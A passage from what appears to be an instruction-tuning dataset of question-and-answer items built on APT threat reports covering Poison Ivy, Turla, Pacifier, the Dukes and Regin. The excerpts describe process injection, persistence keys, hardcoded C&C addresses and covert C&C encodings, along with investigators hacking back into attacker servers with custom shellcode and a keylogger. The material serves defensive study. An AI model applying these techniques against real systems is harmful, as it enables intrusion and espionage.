example of a brute force session:\nThe key is \"pswpsw\". This key must be used in our homemade Metasploit exploit.\nMedium Headline: 3.4 Exploitation\nWith the information we previously described, we were able to get access to the attackers servers.\nOnce connected to the Poison Ivy server, we noticed that the server had no public IP. We attacked a server with the IP X.X.X.X (identified during the scan) and the meterpreter endpoint IP address was Y.Y.Y.Y. We concluded that the Poison Ivy daemon was hidden behind a proxy server, by using port forwarding to hide the real IP of the command & control server. We could also identify that the vendor ID of the MAC address is VMWare. By listing the processes, we are able to validate this hypothesis:\nMedium Headline: 3.5 Shellcode\nAfter a few days the attackers detected our presence on their systems, particularly because of the network connections between their Poison Ivy machines and our machines. Using the netstat command they were able to detect our connection. Basically, the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP. In order to stay stealth we had to connect to the Poison Ivy server through the proxy server. To establish this connection we decided to create our own shellcode.\nThe principle of our shellcode is as follows:\n- Once injected in a process, the shellcode looks for open sockets;\n- Once a opened socket is detected, this socket is closed;\n- After, the shellcode binds itself on the previous open port;\n- From now on, we are going to use the same technique than the one used in meterpreter (bind_tcp).\nOur shellcode goal is to close the Poison Ivy daemon's socket and then open our own socket on the same port. Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server. In this case, when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected target\u2026\nThe source code of the shellcode can be found in appendix.\nMedium Headline: 4.1 Infrastructure schema\nOur investigation allowed us to draw a network schema of the attackers' infrastructure.\nThe infected machines communicate with the proxy through the Internet. The proxy server will forward the network packets to the Poison Ivy server. The proxy feature is done by an executable called xport.exe. This executable can encode network traffic using a xor operation. This feature requires having the executable running on both machines: the proxy and the Poison Ivy server. The syntax on the proxy server is:\nThe argument number can either be set to 1 or 2 and represents the two different encoding keys. The syntax on the Poison Ivy server is:\nxport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number\nThe Poison Ivy server is managed by the attackers through a VMWare remote desktop, so that we were not able to get the real IP address of the attacker. During our investigation, we identified an established Remote Desktop Protocol (RDP) connection between the Poison Ivy server and the proxy server. We decided to install a key-logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server.\nSince the attackers use RDP to manage the proxy server and that we had access, we copied the Windows event logs. Those logs contained all IPs which established a successful RDP authentication. We identified more than 350 unique IPs:\nWe suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy).\nHere is the screenshot of the proxy RDP authentication:\nHere is the screenshot of the Poison Ivy interface:\nHere is the screenshot of an attacker using a remote shell to an infected target:\nUsing those accesses, we managed to exfiltrate a massive amount of files, event logs, netstat outputs\u2026 The interesting information can be divided in two categories:\n- Information about the tools used by the attackers;\n- Information about the targets.\nMedium Headline: 4.3 Targets\nThe attackers seem to use a dedicated proxy and Poison Ivy server combination for each target. When a target discovers the IP address of a proxy, this address is reassigned to another target. That's why it is primordial to share the C&C servers IPs with our partners. The targets were private and public companies, political institutions, activists, associations or reporters.\nOn the Poison Ivy server, a directory is created for every target. Within this directory, a directory for each infected machine was created. The naming convention for those directories is HOSTNAME^USERNAME. Here is an example:\nE:\\companyABCD\\alien^rootbsd\\\nIn those directories files are not sorted in any specific manner. The documents types are:\n- .PPT\n- .XLS\n- .DOC\n- .PDF\n- .JPG\nAmong those documents, we found:\n- Network diagrams;\n- Internal IP/user/password combination (local administrator, domain administrator, root, web, webcam\u2026);\n- Map of the building with digital code to open doors;\n- Security incident listings;\n- Security policies;\n- \u2026\nThe sensitive documents were password protected. The passwords pattern is [a-z]{3,4}[0-9]{3,4}, so it was easy to brute force them in reasonable time. Here is an example of a network diagram.\nMedium Headline: 5.1 Description\nOn one of the proxy server, we identified a binary called Terminator3.6.exe. After a quick analysis we noticed that this binary is the server side of a homemade Remote Administration Tool (RAT). After analysis, we identified that this sample corresponds to Fakem RAT discovered by Trendmicro in January 2013. Additional information can be found there: http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf.\nWe were lucky enough to find the client side (the malware) on the same server. These two binaries allowed us to test the product and see how it works.\n\nWhy did the investigators decide to develop a custom Poison Ivy scanner, and what specific ports did they choose to scan?",
    "output": "The investigators decided to develop a custom Poison Ivy scanner to identify machines using the Poison Ivy RAT. They chose to scan the following ports: 3460 (default Poison Ivy port), 80 (HTTP port), 443 (HTTPS port), and 8080 (alternate HTTP port). This decision was based on the known default and common ports used by the Poison Ivy RAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Analysis - Installer\nSample A can be considered an installer or dropper. It drops files into the system and initializes the environment for production. First, it probes if a virtual disk\n\\DEVICE\\IdeDrive1\\\nis present on the system. If not, the virtual disk is being created with file system NTFS, using FormatEx from Microsofts fmifs.dll.\nThe presence of the malware's configuration file is tested:\n\\DEVICE\\IdeDrive1\\config.txt\nIf not found, it is dropped from the resource section 0x88d90.\nThe following files are dropped depending on whether Windows is running in 32 bit or 64 bit.\n%SystemRoot%\\$NtUninstallQ722833$\\usbdev.sys (hidden)\n\\DEVICE\\IdeDrive1\\inetpub.dll\n\\DEVICE\\IdeDrive1\\cryptoapi.dll\nIndependently from the architecture, the file names of the dropped files are the same, but a specific version of the file is dropped according to the operating system architecture.\nThis is achieved by a logic similar to the following one. This is done for all files except the configuration file.\nSubsequently, after dropping the correct files, the malware makes itself persistent on the system and creates a service with the following parameters, which loads the file usbdev.sys as a kernel driver:\nIf during installation anything goes wrong, the registry keys are deleted. The files however are not.\nDuring the installation process, extensive logging is ensuring good visibility on potential installation problems. The attacker uses english language for the logging, although he is lacking attention to detail when it comes to correct usage of the language, as the following examples demonstrate:\nLanguage deficits are also demonstrated in other files of this collection. We show them in a separate chapter.\nA list of dropped files is given in the next chapter.\nDropped files\nSample B - usbdev.sys (Resource: 101)\nSmall Headline: Strings\n\\\\.\\IdeDrive1\\\\config.txt\nReceiveTimeout\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\nNAME object_id\nVERSION\nUser\nCarbon v3.51\nOPER|Wrong config: bad address|\nMozilla/4.0 (compatible; MSIE 6.0)\nOPER|Wrong config: no port|\nOPER|Wrong config: empty address| address CW_INET quantity user_winmax user_winmin\nST|Carbon v3.51|\n\\\\.\\IdeDrive1\\\\log.txt\nGlobal\\MSMMC.StartupEnvironment.PPT\nGlobal\\411A5195CD73A8a710E4BB16842FA42C\nGlobal\\881F0621AC59C4c035A5DC92158AB85E\nGlobal\\MSCTF.Shared.MUTEX.RPM Global\\WindowsShellHWDetection\nGlobal\\MSDBG.Global.MUTEX.ATF\nTR|%d|\n$Id: hide_module_win32.c 10189 2008-11-25 14:25:41Z gilg $ ZwWow64ReadVirtualMemory64\n$Id: load_lib_win32.c 10180 2008-11-20 12:13:01Z gilg $\n\\SysWOW64\\ \\System32\\\nCreateRemoteThread\nZwTerminateThread\nLdrGetProcedureAddress\nExitThread\n$Id: mutex.c 3940 2006-03-20 16:47:16Z vlad $ $Id: rw_lock.c 4482 2006-08-30 13:07:14Z vlad $\n%x-%x-%x-%x\n%02d/%02d/%02d|%02d:%02d:%02d|%s|u| search.google.com www.easports.com www.sun.com www.dell.com www.3com.com www.altavista.com www.hp.com search.microsoft.com windowsupdate.microsoft.com www.microsoft.com\nwww.asus.com\nwww.eagames.com www.google.com www.astalavista.com www.bbc.com www.yahoo.com\nCreateToolhelp32Snapshot() failed: %d\nOPER|Sniffer '%s' running... ooopppsss...| snoop.exe ettercap.exe wireshark.exe ethereal.exe windump.exe tcpdump.exe\nHTTP/1.1 %sauth.cgi?mode=query&id=%u:%u:%u:%u&serv=%s&lang=en&q=%u-%u&date=%s\n%Y-%m-%d\n%sdefault.asp?act=%u&id=%u&item=%u&event_id=%u&cln=%u&flt=%u&serv=%s&t=%ld&mode=query&lang=en&date=%s lastconnect timestop .bak\n\\\\.\\IdeDrive1\\\\\nD:AI\n@OPER|Wrong timeout: high < low|\nMem alloc err\nP|-1|%d|NULL|%d|\nP|0|%s|%d|HC=%d\nHC|%d|\nP|-1|%d|%s|%d|\n\\\\.\\IdeDrive1\\\\Results\\result.txt\nPOST\nHTTP/1.0\nA|-1|%u|%s|%s|\n%u|%s|%s Task %d failed %s,%d\n\\\\.\\IdeDrive1\\\\Results\\\n207.46.249.57\n207.46.249.56\n207.46.250.119\nmicrosoft.com 207.46.253.125\n207.46.18.94\nupdate.microsoft.com\nG|0|%d|%d| %u|%s|%s|%s\nOPER|Wrong config|\nS|0|%s|\nS|-1|%d|%s| logperiod lastsend logmax logmin\nCopyFile(%s, %s):%d CrPr(),WL(),AU() error: %d\nCrPr() WaitForSingleObject() error: %d\nCrPr() wait timeout %d msec exceeded: %d\nT|-1|%d|%d|\nTask not execute. Arg file failed.\nWORKDATA\nrun_task DELETE\nCOMPRESSION\nRESULT stdout\nCONFIG cmd.exe time2task m_recv() RESULT failed.\nA|-1|%u|%s|%d| active_con m_send() TASK failed.\nOBJECT ACK failed.\nInternal task %d obj %s not equal robj %s... very strange!!! m_recv() OBJECT failed. m_send() OBJECT failed. m_send() WHO failed.\nAUTH failed. m_recv() AUTH failed. m_send() AUTH failed. m_connect() failed. m_setoptlist() failed. net_password= net_user= allow=*everyone write_peer_nfo=%c%s%c frag_no_scrambling=1 frag_size=32768 m_create() failed. frag.np\n\\\\%s\\pipe\\comnode\nW|2|%s|%d| 127.0.0.1 m_send() ZERO failed.\nTrans task %d obj %s ACTIVE fail robj %s net_password=%s net_user=%s\n\\\\%s\\pipe\\%s frag.tcp %s:%d\nW|1|%s|%d|\n%u|%s|%s|%s|%s|%d|%s|%s\n\\\\.\\IdeDrive1\\\\Tasks\\task_system.txt\n%u|%s|%s|%s|%s|%d\n\\\\.\\IdeDrive1\\\\Tasks\\task.txt\n%u|%s|%s|%s|%s\n\\\\.\\IdeDrive1\\\\Tasks\\ W|0|%s|%d|\nW|-1|%s|%d| start\nT|e|%d| T|s|%d| task_max task_min\nI|%d|\nreconstructing block ...\n%6d unresolved strings depth %6d has  bucket sorting ...\n%d pointers, %d sorted, %d scanned  qsort [0x%x, 0x%x]  done %d this %d  main sort initialise ... too repetitive; using fallback sorting algorithm\n%d work, %d block, ratio %5.2f\nCONFIG_ERROR\nOUTBUFF_FULL UNEXPECTED_EOF\nIO_ERROR\nDATA_ERROR_MAGIC\nDATA_ERROR\nMEM_ERROR PARAM_ERROR\nSEQUENCE_ERROR codes %d code lengths %d, selectors %d, bytes: mapping %d, pass %d: size is %d, grp uses are initial group %d, [%d .. %d], has %d syms (%4.1f%%)\nY@  %d in block, %d after MTF & 1-2 coding, %d+2 syms in use final combined CRC = 0x%x\nblock %d: crc = 0x%8x, combined CRC = 0x%8x, size = %d\n$Id: b2_to_m2_stub.c 5273 2007-01-23 17:41:15Z vlad $\n$Id: b_tcp.c 8474 2007-09-19 15:40:39Z vlad $\nTCP: closed.\nTCP: connecting...\nY1N0 nodelay\nTCP: send\nTCP: recv\n%s:%u nodelay=1\nTCP: resolved %s\nTCP: resolving host name...\n$Id: l1_check.c 4477 2006-08-28 15:58:21Z vlad $\n$Id: m2_to_b2_stub.c 4477 2006-08-28 15:58:21Z vlad $\n$Id: m_frag.c 8715 2007-11-29 16:04:46Z urik $ peer_frag_size frag_no_scrambling frag_size\nFrag: send\n$Id: m_np.c 8825 2008-01-10 13:13:15Z vlad $\n\\\\.\\pipe\\ no_server_hijack imp_level net_password net_user write_peer_nfo read_peer_nfo\n*everyone allow\n$Id: np_win32_common.c 4483 2006-08-30 13:13:51Z vlad $ anonymous every1\n\\ipc$ \\pipe\\\n$Id: t_byte1.c 5324 2007-01-30 12:45:35Z vlad $ frag\n$Id: t_manager.c 8715 2007-11-29 16:04:46Z urik $ transports\n$Id: t_message1.c 5290 2007-01-26 11:15:03Z vlad $ licence error\n\nAnswer this question based on the above context: How does the Turla malware ensure persistence on the system, and what steps does it take to create a service that loads the kernel driver?",
    "output": "The Turla malware ensures persistence on the system by creating a service that loads the file 'usbdev.sys' as a kernel driver. During the installation process, the malware first checks for the presence of a virtual disk (\\DEVICE\\IdeDrive1\\). If the virtual disk is not present, it creates one with the NTFS file system using FormatEx from Microsoft's fmifs.dll. The malware then drops several files, including 'usbdev.sys', 'inetpub.dll', and 'cryptoapi.dll', into specific locations based on the system architecture (32-bit or 64-bit). After dropping the correct files, the malware makes itself persistent by creating a service with parameters that load 'usbdev.sys'. If any errors occur during installation, the registry keys are deleted, but the files remain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The Second Dropper\nThe payload dropper, ubfic.exe, contains its files in its .data section and is not encrypted or compressed. It creates the files:\n- %temp%\\ntlm.exe\n- %temp%\\msvci.dll\n- %temp%\\msvcp.dll\n- %temp%\\msvck.dll\n- %temp%\\msvct.dll\n- %temp%\\msvci.exe (64 bit)\n- %temp%\\msvck60.dll (64 bit)\n- %temp%\\msvct60.dll (64 bit)\nThese files make up the payload. The last three are for 64-bit Windows, the rest are for the 32-bit version. The starting point of the payload is the ntlm.exe file which is discussed below. Next, using COM objects, the dropper modifies the .lnk files from the desktop and saves the original links in %temp%\\Links folder. The links are modified to start the trojan:\nThe target file of the link is replaced with ntlm.exe and the original target is sent as a parameter to ntlm.exe, which upon execution will execute it. Next, the dropper creates %temp%\\startup.bat which adds to the registry:\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostUpdate -> %TEMP%\\ntlm.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\ntlm.exe\nThe first key is for starting the trojan, along the .lnk files. Some versions do not have the lnk feature, only the registry keys. The second key is never used in our samples.\nLast file created is %temp%\\Axpim\\selfdel.bat for self-deletion.\nSmall Headline: msvcp.dll\n32 bit library used for returning the PID of one of the processes: iexplore.exe, outlook.exe, firefox.exe, chrome.exe. It hase one export, msvcp, which enumerates running processes and checks their names. It will return the PID of the first one found. If the processes could not be enumerated it returns 0. If no process was found it returns -1. Instead of storing the actual names of those processes in the dll, it stores a byte array as a key and one byte array (result) for each of the 4 names. The checking is done: ProcessName xor key == result, on coresponding bytes. The function may return different PIDs when processes are stopped or started.\nSmall Headline: msvci.dll\n32 bit library used for injecting msvck.dll (the 32 bit backdoor) into a running 32 bit process. The library has one export msvci, which takes one parameter representing the PID of a running process. It allocates a small chunk of memory into that process (260 bytes). In this memory it copies the path to the msvck.dll file, which is found in %temp%\\msvck.dll.\nThen, from the current process it gets the address of LoadLibraryA function and creates a remote thread in the target process starting at that address. The parameter sent for the thread function is the address of the new allocated string containing the path to msvck.dll. As a result, in the target process, a thread is created which just executes LoadLibraryA(\"path to msvck.dll\").\nThis method will work even if ASLR is enabled, because the random loading offset for dlls is calculated once per boot and by default one dll is loaded at the same address in different processes. msvci.exe\n64 bit application used for injecting msvck60.dll (the 64 bit backdoor) into a running 64bit process. The executable takes a commandline parameter representing a PID. The functionality is identical to msvci.dll library. ntlm.exe\nThis is the file that starts the trojan. First, it creates a named pipe \\\\.\\pipe\\bc367 used as a mutex, as the file will probably be executed many times from the shortcuts. The name of the pipe and all other strings in the file and in the rest of the dlls are encrypted with RC4. It sets the other files of the trojan (msvci.dll, msvcp.dll, msvck.dll, msvct.dll, msvci.exe, msvck60.dll, msvct60.dll) as hidden, ntml.exe will not be hidden.\nAfterwards, the executable enters an infinite loop.\nIt checks if the file %temp%\\msvci.dll exists, if it does not exist it will do a self destroy: deletes all components, deletes registry keys, restores the original lnk files from %temp%\\Links, closes the pipe. This behaviour is used by the backdoor component later for self deleting.\nNext it loads the msvcp.dll library and call msvcp export from it. This function returns the PID of one of the processes: iexplore.exe, outlook. exe, firefox.exe, chrome.exe, and 0 or -1 if none of those processes was found. If a process was found, its PID is saved into a variable, then the program checks whether that process is a 32 bit or 64 bit process.\nIf it is a 32 bit process it calls msvci export from msvci.dll with one parameter, the PID. If the process is a 64 bit process it creates a\nprocess from msvci.exe with the commandline parameter being the PID converted to ascii, base 10 (ex: msvci.exe 728).\nThe purpose of msvci.dll and msvci.exe (64bit) is to inject the payload into a process. After this it sleeps 30 seconds and repeats indefinitely.\nThe saved PID is checked so that it doesn't inject again into the same process. This mecanism is flawed because another process from the list could be found and it will inject into it also, or it is possible to inject in the same process twice, for example outlook.exe opened first and injected then iexplore.exe opened second and injected then iexplore.exe closed and outlook.exe injected again.\nAnother bug can appear if msvcp.dll will be deleted because when calling LoadLibrary and GetProcAddress it doesn't check the return values and the program will crash when calling a NULL pointer.\nSmall Headline: msvct.dll\n32 bit library contains functions for communicating with the C&C, using WinINet API. The backdoor does  not contain any C&C addresses or networking logic, it just uses the exports from msvct.dll, namely:\n- BOOL CI(void) \u2013 Checks for internet connection. Returns true if a http request (\"GET /1\") to  www.google.com succeeds; returns false if not.\n- BOOL SHR(char *ServerAddr, char *ServerScript, void *ID, void *SendBuff, void *RecvBuff, void *extra) \u2013 Sends and receives data to/ from C&C. The communication is encrypted through HTTPS, port 443.\n- Extra flags are used for the connection: INTERNET_FLAG_IGNORE_ CERT_DATE_INVALID, INTERNET_FLAG_IGNORE_CERT_ CN_INVALID, SECURITY_FLAG_IGNORE_UNKNOWN_CA to ignore errors caused by invalid certificates. ServerAddr and ServerScript make the address of the C&C, these are found using the CS export. ID is a structure made from a buffer (string) and its length. The ID string will be put into the HTTP headers. SendBuff is the same type of structure like the ID. SendBuff contains data that is sent to the C&C. RecvBuff is a structure that contains 4 members, 3 being pointers: a data buffer, a buffer length and two strings. This structure will be filled with data coming from C&C. The data buffer can contain batch commands or whole files to be written to disk. The first string will contain the Content-Type from the headers and this will be the command for the backdoor. The second string will contain the Content-Location from the headers and will have the name of a file for download/upload commands. The last parameter, extra, is again a structure from a buffer and its length. It is optional. The string that it contains is sent through the HTTP header. This is used by the CS export and then it contains that \"Check: RandomNr\" string for C&C validation. It is also used in the \"upload\" backdoor command. The function returns true or false.\n- BOOL CS(void *ID, char *ServerAddr, char *ServerScript) \u2013 Check C&C connectivity. Returns true if it founds a valid C&C and ServerAdd, ServerScript (output parameters) will contain the address and the page/script of the C&C. ID (input parameter) is a structure that contains a string and its length. The string represents an ID identifying the infected system. This function tries two hardcoded C&C addresses: 88.208.0.130/rss.php, 78.47.51.238/rss.php (other variants used different addreses). It generates a random number from 0 to 32767 and then creates a string with it, such as: \"Check: 1352\". This string will be sent in the http headers using SHR function to the C&C. If a C&C is alive it must respond with the string \"1352\" back. If none of the two C&Cs are alive the function returns false.\n\nAnswer this question based on the above context: What is the purpose of msvct.dll in the Pacifier APT and how does it facilitate communication with the Command and Control (C&C) server?",
    "output": "The msvct.dll in the Pacifier APT is a 32-bit library that contains functions for communicating with the C&C server using the WinINet API. It provides several exports, including CI, SHR, and CS. The CI function checks for an internet connection by sending a GET request to www.google.com. The SHR function sends and receives data to/from the C&C server over HTTPS, ignoring certificate errors. The CS function checks C&C connectivity by trying two hardcoded C&C addresses and generating a random number to validate the connection. These functions allow the backdoor to communicate securely with the C&C server without containing any networking logic itself.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 2014: MiniDuke's rise from the ashes\nWhile MiniDuke activity decreased significantly during the rest of 2013 following the attention it garnered from researchers, the beginning of 2014 saw the toolset back in full force. All MiniDuke components, from the loader and downloader to the backdoor, had been slightly updated and modified during the downtime. Interestingly, the nature of these modifications suggests that their primary purpose was to regain the element of stealth and undetectability that had been lost almost a year earlier.\nOf these modifications, arguably the most important were the ones done to the loader. These resulted in a loader version that would later become known as the \"Nemesis Gemina loader\" due to PDB strings found in many of the samples. It is however still only an iteration on earlier versions of the MiniDuke loader.\nThe first observed samples of the Nemesis Gemina loader (compiled on 14th December 2013) were used to load the updated MiniDuke backdoor, but by the spring of 2014 the Nemesis Gemina loader was also observed in use with CosmicDuke.\n2014: CosmicDuke's moment of fame and the scramble that ensued\nFollowing the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2nd July 2014 . The next day, Kaspersky also published their own research on the malware. It should be noted that until this point, even though CosmicDuke had been in active use for over 4 years, and had undergone minor modifications and updates during that time, even the most recent CosmicDuke samples would often embed persistence components that date back to 2012. These samples would also contain artefacts of functionality from the earliest CosmicDuke samples from 2010.\nIt is therefore valuable to observe how the Dukes reacted to CosmicDuke's outing at the beginning of July. By the end of that month, CosmicDuke samples we found that had been compiled on the 30th of July had shed unused parts of their code that had essentially just been relics of the past. Similarly, some of the hardcoded values that had remained unaltered in CosmicDuke samples for many years had been changed. We believe these edits were an attempt at evading detection by modifying or removing parts of the toolset that the authors believed might be helpful in identifying and detecting it.\nConcurrently with the alterations to CosmicDuke, the Dukes were also hard at work modifying their trusted loader. Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the first known samples from 2010. Again, much of the modification work focused on removing redundant code in an attempt to appear different from earlier versions of the loader. Interestingly however, another apparent evasion trick was also attempted -  forging of the loaders' compilation timestamps.\nIMAGE 6: COZYDUKE DECOYS\nLeft - US letter fax test decoy used  in CozyDuke campaigns\nRight - Screenshot of the monkey video decoy also used by CozyDuke\nThe first CosmicDuke sample we observed after the initial research on CosmicDuke was a sample compiled on the 30th of July 2014. The loader used by the sample purported to have been compiled on the 25th of March 2010. Due to artefacts left in the loader during compilation time however, we know that it used a specific version of the Boost library, 1.54.0, that was only published on the 1st of July 2013. The compilation timestamp therefore had to have been faked. F-Secure's whitepaperon CosmicDuke includes a timeline of the loader's usage, based on compilation timestamps. Perhaps the Dukes group thought that by faking a timestamp from before the earliest one cited in the whitepaper, they might be able to confuse researchers.\nDuring the rest of 2014 and the spring of 2015, the Dukes continued making similar evasion-focused modifications to CosmicDuke, as well as experimenting with ways to obfuscate the loader. In the latter case however, the group appear to have also simultaneously developed an entirely new loader, which we first observed being used in conjunction with CosmicDuke during the spring of 2015.\nWhile it is not surprising that the Dukes reacted to multiple companies publishing extensive reports on one of their key toolsets, it is valuable to note the manner in which they responded. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. Instead, they opted for minimal downtime and attempted to continue operations, with only minor modifications to the toolset.\n2014: CozyDuke and monkey videos\nWhile we now know that CozyDuke had been under development since at least the end of 2011, it was not until the early days of July 2014 that the first large-scale CozyDuke campaign that we are aware of took place. This campaign, like later CozyDuke campaigns, began with spear-phishing emails that tried to impersonate commonly seen spam emails. These spear-phishing emails would contain links that eventually lead the victim to becoming infected with CozyDuke.\nSome of the CozyDuke spear-phishing emails from early July posed as e-fax arrival notifications, a popular theme for spam emails, and used the same \"US letter fax test page\" decoy document that was used a year later by CloudDuke. In at least one case however, the email instead contained a link to a zip-archive file named \"Office Monkeys LOL Video.zip\", which was hosted on the DropBox cloud storage service. What made this particular case interesting was that instead of the usual dull PDF file, the decoy was a Flash video file, more specifically a Super Bowl advertisement from 2007 purporting to show monkeys at an office (image 6, above).\n2014: OnionDuke gets caught using a malicious Tor node\nOn the 23rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found. They noted that this node appeared to be maliciously modifying any executables that were downloaded through it over a HTTP connection. Executing the modified applications obtained this way would result in the victim being infected with unidentified malware. On the 14th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke, the other Duke toolsets known at the time .\nBased on our investigations into OnionDuke, we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identified by the researchers was being used to wrap executables on-the-fly with OnionDuke ((<>)image (<>)7, page 13). This is similar to the way in which the toolset was being spread via trojanized applications in torrent files during the summer of 2013.\nWhile investigating the OnionDuke variant being spread by the malicious Tor node, we also identified another OnionDuke variant that appeared to have successfully compromised multiple victims in the ministry of foreign affairs of an Eastern European country during the spring of 2014. This variant differed significantly in functionality from the one being spread via the Tor node, further suggesting that different OnionDuke variants are intended for different kinds of victims.\nWe believe that, unusually, the purpose of the OnionDuke variant spread via the Tor node was not to pursue targeted attacks but instead to form a small botnet for later use. This OnionDuke variant is related to the one seen during the summer of 2013 being spread via torrent files. Both of these infection vectors are highly indiscriminate and untargeted when compared to spear-phishing, the usual infection vector of choice for the Dukes.\nFurther, the functionality of the OnionDuke variant is derived from a number of modules. While one of these modules gathers system information and another attempts to steal the victim's usernames and passwords, as one would expect from a malware used for a targeted attack, the other two known OnionDuke modules are quite the opposite; one is designed for use in DoS attacks and the other for posting predetermined messages to the Russian VKontakte social media site. This sort of functionality is more common in criminality-oriented botnets, not state-sponsored targeted attacks.\nWe have since been able to identify at least two separate OnionDuke botnets. We believe the formation of the first of these botnets began in January 2014, using both unidentified infection vectors and the known malicious Tor node, and continued until our blogpost was published in November. We believe the formation of the second botnet began in August 2014 and continued until January 2015. We have been unable to identify the infection vectors used for this second botnet, but the C&C servers it used had open directory listings, allowing us to retrieve files containing listings of victim IP addresses. The geographic distribution of these IP addresses ((<>)image 8, (<>)page 13) further supports our theory that the purpose of this OnionDuke variant was not targeted attacks against high-profile targets.\nOne theory is that the botnets were a criminal side business for the Dukes group. The size of the botnet however (about 1400 bots) is very small if its intended use is for commercial DoS attacks or spam-sending. Alternatively, OnionDuke also steals user credentials from its victims, providing another potential revenue source. The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets.\nAnswer this question: How did the Dukes modify the MiniDuke loader in 2014, and what was the significance of these modifications?",
    "output": "The Dukes modified the MiniDuke loader in 2014 to regain the element of stealth and undetectability that had been lost almost a year earlier. The most significant modification was the creation of the 'Nemesis Gemina loader,' which was an iteration on earlier versions of the MiniDuke loader. This loader was initially used to load the updated MiniDuke backdoor but was later observed in use with CosmicDuke by the spring of 2014. These modifications were crucial for the Dukes to continue their operations without being easily detected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Encrypted virtual file system containers\nRegin stores data files and payloads on disk in encrypted virtual file system files. Such files are accessed by the major routines 3Dh. Files stored inside EVFS containers are encrypted with a variant of RC5, using 64-bit blocks and 20 rounds. The encryption mode is reverse cipher feedback (CFB).\nKnown extensions for EVFS containers are *.evt and *.imd. The structure of a container is similar to the FAT file system. One major difference is that files do not have a name; instead, they're identified using a binary tag. The tag itself is the\nconcatenation of a major number and a minor number. The major number typically indicates the major function group that will handle the file.\nA container starts with the header in Table 3 (little-endian ordering).\nThe header is followed by the file entry table (Table 4). Each file entry is 13h+taglen bytes long.\nThe sectors follow (Table 5). A sector of sectsize bytes starts with a DWORD pointing to the next sector (if the file does not fit within a single sector), followed by sectsize-4 bytes of payload data.\nAs explained above, the files are encrypted. Other layers of encryption and compression may also be in place, although those would be handled by higher level components.\nSmall Headline: Command-and-control operations\nRegin's C&C operations are extensive. These backchannel operations are bidirectional, which means either the attackers can initiate communications with compromised computers on the border network or the compromised computers can initiate communications with the attacker. Furthermore, compromised computers can serve as a proxy for other infections and command and control can also happen in a peer-to-peer fashion. All communications are strongly encrypted and can happen in a two-stage fashion where the attacker may contact a compromised computer using one channel to instruct it to begin communications on a different channel. Four transport protocols are available for C&C:\n\u2022 ICMP: Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data. The string 'shit' is scattered in the packet for data validation. In addition, CRC checks use the seed '31337'.\n\u2022 UDP: Raw UDP payload\n\u2022 TCP: Raw TCP payload\n\u2022 HTTP: Payload information can be encoded and embedded within cookie data under the names SESSID, SMSWAP, TW, WINKER, TIMESET, LASTVISIT, AST.NET_SessionId, PHPSESSID, or phpAds_d. This information can be combined with another cookie for validation under the names USERIDTK, UID, GRID, UID=PREF=ID, TM, __utma, LM, TMARK, VERSION, or CURRENT\nThe C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.\nMedium Headline: Payloads\nRegin can be distributed with various payload modules or receive payload modules after infection. The extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in order to enhance Regin's capabilities. Furthermore, we have found data files accompanying payload modules that have not been recovered. The following table describes the Stage 4 kernel payload modules and Stage 5 user mode payload modules, which we have seen several variants of Regin use.\nThe IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial infection and was specifically deployed for a particular target.\nMedium Headline: 64-bit version\nOnly a small amount of the 64-bit Regin files have been recovered. These samples may represent version 2.0 or their differences may possibly be solely specific to 64-bit versions of Regin. We also recovered files from infected computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that aims to retrieve binary data over pipes or sockets and execute the data.\nSmall Headline: Stage differences\nThe 64-bit version of Regin's Stage 1 (wshnetc.dll) is no longer a kernel mode driver, as drivers under 64-bit Windows must be signed. Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting up. Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of\nphysical location) on disk and searches for the payload in the raw sectors in this area of the disk.\nThe 64-bit Regin's Stage 3 has not been recovered. We believe that it may not exist, as the 32-bit version is a driver. Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export functionality.\nStage 5 uses the following filenames:\n\u2022 %Windir%\\IME\\IMESC5\\DICTS\\PINTLGBP.IMD contains Stage 5 user payloads, replacing SystemLog.Evt in the 32-bit version\n\u2022 %Windir%\\IME\\IMESC5\\DICTS\\PINTLGBS.IMD contains Stage 5 data files, replacing SecurityLog.Evt in the 32-bit version\n\u2022 The equivalent files for SystemAudit.Evt and SecurityAudit.Evt were not recovered\nNo Stage 5 payload modules have been recovered.\nMedium Headline: Conclusion\nRegin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering campaigns. The development and 